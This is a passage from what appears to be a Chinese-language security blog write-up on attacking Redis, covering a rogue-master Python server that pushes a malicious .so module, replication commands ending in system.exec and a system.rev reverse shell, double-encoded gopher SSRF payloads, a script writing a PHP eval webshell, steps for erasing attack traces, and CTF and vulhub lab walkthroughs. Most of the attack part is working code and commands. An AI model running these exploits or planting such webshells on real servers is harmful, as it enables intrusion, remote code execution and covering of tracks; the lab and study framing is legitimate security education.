
        <span class="hljs-keyword">return</span> data.strip().split()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            data = self.request.recv(<span class="hljs-number">1024</span>)
            <span class="hljs-built_in">print</span>(data)
            logging.info(<span class="hljs-string">"receive data: %r"</span>, data)
            arr = self.decode(data)
            <span class="hljs-keyword">if</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'PING'</span>):
                self.request.sendall(<span class="hljs-string">b'+PONG'</span> + DELIMITER)
            <span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'REPLCONF'</span>):
                self.request.sendall(<span class="hljs-string">b'+OK'</span> + DELIMITER)
            <span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'PSYNC'</span>) <span class="hljs-keyword">or</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'SYNC'</span>):
                self.request.sendall(<span class="hljs-string">b'+FULLRESYNC '</span> + <span class="hljs-string">b'Z'</span> * <span class="hljs-number">40</span> + <span class="hljs-string">b' 1'</span> + DELIMITER)
                self.request.sendall(<span class="hljs-string">b'$'</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(self.server.payload)).encode() + DELIMITER)
                self.request.sendall(self.server.payload + DELIMITER)
                <span class="hljs-keyword">break</span>

        self.finish()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>(<span class="hljs-params">self</span>):
        self.request.close()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoServer</span>(socketserver.TCPServer):
    allow_reuse_address = <span class="hljs-literal">True</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, server_address, payload</span>):
        <span class="hljs-built_in">super</span>(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="hljs-literal">True</span>)
        self.payload = payload

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    expfile = <span class="hljs-string">'/home/hybcx/flag.txt'</span>  <span class="hljs-comment">#我们要传输的恶意文件的路径</span>
    lport = <span class="hljs-number">6666</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(expfile, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
        server = RoguoServer((<span class="hljs-string">'0.0.0.0'</span>, lport), f.read())
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] listening ......"</span>)
    server.handle_request()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] completed ~~~"</span>)</code></pre>
<p>之后现在kali上执行如下命令：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229220743984.png" alt="image-20231229220743984"></p>
<p>配置好之后，我们开启恶意master</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229221144741.png" alt="image-20231229221144741"></p>
<p>当其运行结束后，我们在靶机上即可查看到flag.txt被写入。这里肯定想着为何kali上执行个py就写入了呢，因为在此之前我们已经将我们的恶意master设置为了主redis，那我们在其中的任何操作，都可以同步到从redis，也就是我们的靶机，我们这里的py逻辑就是与从服务器命令交互完，直接发送payload，造成文件上传</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229221135874.png" alt="image-20231229221135874"></p>
<p>实际上细细研究发现这里似乎存在一个时间问题，比如我早就在从redis上配置好了我主redis的ip即端口，但此时主redis还没开启，是休眠状态，但一当我开启主redis，从redis就会向主redis发送PING命令，等待具体的回复，究竟是要进行全量复制，还是增量复制等等等等。而我们上述的恶意master会在从redis发送给我们PING命令之后给予相关的回应，最后发送给从redis进行全量复制的命令，最终导致我们的恶意文件上传效果。</p>
<h3 id="redis加载恶意so"><a target="_blank" rel="noopener" href="http://xn--redis-j86ho04f88am66w.so">redis加载恶意.so</a></h3>
<p>这里思路大致与上述一直，这里我们改一下配置即可（注意这里依旧是利用redis未授权）</p>
<pre><code class="hljs php"><span class="hljs-comment">#设置redis的备份路径为当前目录</span>
config set dir ./   
<span class="hljs-comment">#设置备份文件名为exp.so，默认为dump.rdb</span>
config set dbfilename exp.so
<span class="hljs-comment">#设置主服务器IP和端口</span>
slaveof <span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span> <span class="hljs-number">1234</span>  
<span class="hljs-comment">#加载恶意模块</span>
module load ./exp.so
<span class="hljs-comment">#执行系统命令</span>
system.exec <span class="hljs-string">'whoami'</span>
system.rev <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">9999</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230161304017.png" alt="image-20231230161304017"></p>
<p>如图所示，配置好后我们开启恶意master，但这里不知道为何设置备份目录为当前的时候不成功。。。就先设置tmp了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> socketserver
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> time

logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="hljs-built_in">format</span>=<span class="hljs-string">'&gt;&gt; %(message)s'</span>)

DELIMITER = <span class="hljs-string">b"\r\n"</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoHandler</span>(socketserver.BaseRequestHandler):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, data</span>):
        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b'*'</span>):
            <span class="hljs-keyword">return</span> data.strip().split(DELIMITER)[<span class="hljs-number">2</span>::<span class="hljs-number">2</span>]
        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b'$'</span>):
            <span class="hljs-keyword">return</span> data.split(DELIMITER, <span class="hljs-number">2</span>)[<span class="hljs-number">1</span>]

        <span class="hljs-keyword">return</span> data.strip().split()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            data = self.request.recv(<span class="hljs-number">1024</span>)
            <span class="hljs-built_in">print</span>(data)
            logging.info(<span class="hljs-string">"receive data: %r"</span>, data)
            arr = self.decode(data)
            <span class="hljs-keyword">if</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'PING'</span>):
                self.request.sendall(<span class="hljs-string">b'+PONG'</span> + DELIMITER)
            <span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'REPLCONF'</span>):
                self.request.sendall(<span class="hljs-string">b'+OK'</span> + DELIMITER)
            <span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'PSYNC'</span>) <span class="hljs-keyword">or</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b'SYNC'</span>):
                self.request.sendall(<span class="hljs-string">b'+FULLRESYNC '</span> + <span class="hljs-string">b'Z'</span> * <span class="hljs-number">40</span> + <span class="hljs-string">b' 1'</span> + DELIMITER)
                self.request.sendall(<span class="hljs-string">b'$'</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(self.server.payload)).encode() + DELIMITER)
                self.request.sendall(self.server.payload + DELIMITER)
                <span class="hljs-keyword">break</span>

        self.finish()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>(<span class="hljs-params">self</span>):
        self.request.close()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoServer</span>(socketserver.TCPServer):
    allow_reuse_address = <span class="hljs-literal">True</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, server_address, payload</span>):
        <span class="hljs-built_in">super</span>(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="hljs-literal">True</span>)
        self.payload = payload

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    expfile = <span class="hljs-string">'/home/hybcx/Tools/redis-rogue-getshell/exp.so'</span>  <span class="hljs-comment">#我们要传输的恶意文件的路径</span>
    lport = <span class="hljs-number">6666</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(expfile, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
        server = RoguoServer((<span class="hljs-string">'0.0.0.0'</span>, lport), f.read())
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] listening ......"</span>)
    server.handle_request()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] completed ~~~"</span>)</code></pre>
<p>记得修改恶意文件路径吗，如下图运行之后执行system命令成功</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230161411475.png" alt="image-20231230161411475"></p>
<h3 id="ssrf进行redis加载so"><a target="_blank" rel="noopener" href="http://xn--SSRFredis-ew5o4638bnbsay8a.so">SSRF进行redis加载.so</a></h3>
<p>这里虽然进行了上述的实操，但感觉不够真实，毕竟感觉现实中存在ssrf的概率才是大的，虽然可以爆破弱口令，但总感觉少点什么。而且这里的ssrf攻击的过程一直没搞成功，现在再来搞一下。</p>
<p>这里我们先取消redis的主从关系，并且重新配置文件，开启目标redis的保护模式，以及只让其监听本地127.0.0.1。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230161948095.png" alt="image-20231230161948095"></p>
<p>之后重启redis服务</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230162228324.png" alt="image-20231230162228324"></p>
<p>确定一下对方服务的配置，现在我们进行构造恶意命令</p>
<pre><code class="hljs php"><span class="hljs-comment">#第一次攻击</span>
config set dir /tmp
config set dbfilename exp.so
slaveof <span class="hljs-number">192.168</span>.<span class="hljs-number">246.130</span> <span class="hljs-number">6666</span>
<span class="hljs-comment">#第二次攻击</span>
module load /tmp/exp.so
system.exec <span class="hljs-string">"id"</span></code></pre>
<p>在这里分两次是因为第一次我们在传入命令之后，exp.so还未被加载，之后第二次才输入的加载指令，当然你也可以合并上述两个payload，然后发送两次。</p>
<pre><code class="hljs scss">gopher://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_config%<span class="hljs-number">2520s</span>et%<span class="hljs-number">2520</span>dir%<span class="hljs-number">2520</span>/tmp%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">2520s</span>et%<span class="hljs-number">2520</span>dbfilename%<span class="hljs-number">2520ex</span>p.so%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aslaveof%<span class="hljs-number">2520192.168</span>.<span class="hljs-number">246.130%</span><span class="hljs-number">25206666%</span><span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Amodule%<span class="hljs-number">2520</span>load%<span class="hljs-number">2520</span>/tmp/exp.so%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asystem.exec%<span class="hljs-number">2520%</span><span class="hljs-number">2522</span>id%<span class="hljs-number">2522%</span><span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A</code></pre>
<p>这里进行了两次编码，但是在我发送两次之后页面并没有回显，不知道是否是配置问题，但在靶机上测试如下，发现是成功加载的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230165445669.png" alt="image-20231230165445669"></p>
<p>这让我突然迷惑了，是否我太过钻牛角尖了，本来如果这里存在ssrf的话，我们本就可以进行写入公钥，写webshell等等，这样的话我们完全就可以连接上对方redis服务，这样的话就没必要非得利用ssrf来rce了。这里的疑惑还是通过一会儿的做题来感受吧。。。</p>
<h2 id="痕迹清除">痕迹清除</h2>
<p>为了减少对服务器的影响，攻击完成后，应该尽量清除痕迹，需要恢复目录和数据库文件，卸载同时删除模块，而数据原本的配置信息，需要在攻击之前进行备份。</p>
<pre><code class="hljs php">CONFIG get *    <span class="hljs-comment"># 获取所有的配置</span>
CONFIG get dir   <span class="hljs-comment"># 获取 快照文件 保存的 位置</span>
CONFIG get dbfilename   <span class="hljs-comment"># 获取 快照文件 的文件名</span>
<span class="hljs-comment">#切断主从，关闭复制功能</span>
slaveof no one 
<span class="hljs-comment">#恢复目录</span>
config set dir /data
<span class="hljs-comment">#通过dump.rdb文件恢复数据</span>
config set dbfilename dump.rdb
<span class="hljs-comment">#删除exp.so</span>
system.exec <span class="hljs-string">'rm ./exp.so'</span>
<span class="hljs-comment">#卸载system模块的加载</span>
module unload system</code></pre>
<p>漏洞利用的版本是redis 4.x/5.x ，如果是先前版本的Redis，则无法加载模块，自然也就无法利用。在网上开了几个开源的利用脚本，都没有进行版本的判断，如果直接使用exp，除了攻击失败外，可能会修改了 dir 和dbfilename ，这些都可以通过redis未授权修改回原来的配置（前提是有提前备份），而目录下会多生成一个 exp.so文件。</p>
<h1 id="0x06-题目实战">0x06 题目实战</h1>
<h2 id="ctfhub-ssrf-redis协议">CTFHUB-SSRF-redis协议</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230172330268.png" alt="image-20231230172330268"></p>
<p>看到url，那开始测试</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230172356029.png" alt="image-20231230172356029"></p>
<p>发现存在6379的redis服务，那我们看看是否对方redis设置了密码，脚本跑一下，如下图，发现没有设置</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230172618573.png" alt="image-20231230172618573"></p>
<p>那这里我想的就是先尝试写webshell，话不多说直接上脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib
protocol=<span class="hljs-string">"gopher://"</span>
ip=<span class="hljs-string">"127.0.0.1"</span>
port=<span class="hljs-string">"6379"</span>
shell=<span class="hljs-string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
filename=<span class="hljs-string">"shell.php"</span>
path=<span class="hljs-string">"/var/www/html"</span>
passwd=<span class="hljs-string">""</span>
cmd=[<span class="hljs-string">"flushall"</span>,
     <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"${IFS}"</span>)),
     <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
     <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
     <span class="hljs-string">"save"</span>
     ]
<span class="hljs-keyword">if</span> passwd:
    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
payload=protocol+ip+<span class="hljs-string">":"</span>+port+<span class="hljs-string">"/_"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF=<span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd=<span class="hljs-string">""</span>
    cmd+=<span class="hljs-string">"*"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd+=CRLF+<span class="hljs-string">"$"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>))))+CRLF+x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>)
    cmd+=CRLF
    <span class="hljs-keyword">return</span> cmd

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += urllib.quote(redis_format(x))
    <span class="hljs-built_in">print</span> urllib.quote(payload)</code></pre>
<p>py2运行，这里需要两次url编码</p>
<pre><code class="hljs plaintext">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%25
5D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230172917747.png" alt="image-20231230172917747"></p>
<p>直接url上传，之后访问shell.php</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230172959844.png" alt="image-20231230172959844"></p>
<p>成功上传并拿到flag</p>
<h2 id="redis-4x5x主从复制rce">Redis 4.x/5.x主从复制RCE</h2>
<p>复现地址：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/redis/4-unacc/">https://vulhub.org/#/environments/redis/4-unacc/</a></p>
<p>直接vulhub一键启动靶机，之后kali尝试连接目标redis，如下图，存在未授权访问</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230190041291.png" alt="image-20231230190041291"></p>
<p>直接上exp，这里使用了两种，但感觉第一种更好一点</p>
<pre><code class="hljs py">python3 redis-rogue-server.py --rhost <span class="hljs-number">192.168</span><span class="hljs-number">.246</span><span class="hljs-number">.137</span> --rport <span class="hljs-number">6379</span> --lhost <span class="hljs-number">192.168</span><span class="hljs-number">.246</span><span class="hljs-number">.130</span> <span class="hljs-number">6666</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230194558436.png" alt="image-20231230194558436"></p>
<p>可以看到直接就拿到shell了</p>
<p>第二个：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
<pre><code class="hljs py">python3 redis-master.py -r <span class="hljs-number">192.168</span><span class="hljs-number">.246</span><span class="hljs-number">.137</span> -p <span class="hljs-number">6379</span> -L <span class="hljs-number">192.168</span><span class="hljs-number">.246</span><span class="hljs-number">.130</span> -P <span class="hljs-number">6666</span> -f RedisModulesSDK/exp.so -c <span class="hljs-string">"id"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230194640807.png" alt="image-20231230194640807"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231230194648625.png" alt="image-20231230194648625"></p>
<h2 id="网鼎杯-2020-玄武组ssrfme">[网鼎杯 2020 玄武组]SSRFMe</h2>
<p>这里推荐去nssctf平台复现，buu似乎有问题</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>
<span class="hljs-function"></span>{
    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,<span class="hljs-variable">$url</span>);
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)
    {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'url fomat error'</span>);
    }
    <span class="hljs-keyword">try</span>
    {
        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);
    }
    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)
    {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'url fomat error'</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">'host'</span>];
    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);
    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'127.0.0.0'</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'10.0.0.0'</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'172.16.0.0'</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'192.168.0.0'</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>
<span class="hljs-function"></span>{

    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>))
    {
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">' is inner ip'</span>;
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">'redirect_url'</span>])
        {
            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">'redirect_url'</span>]);
        }
        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>);
    }

}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>])){
    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>];
    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>)){
        <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>);
    }
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
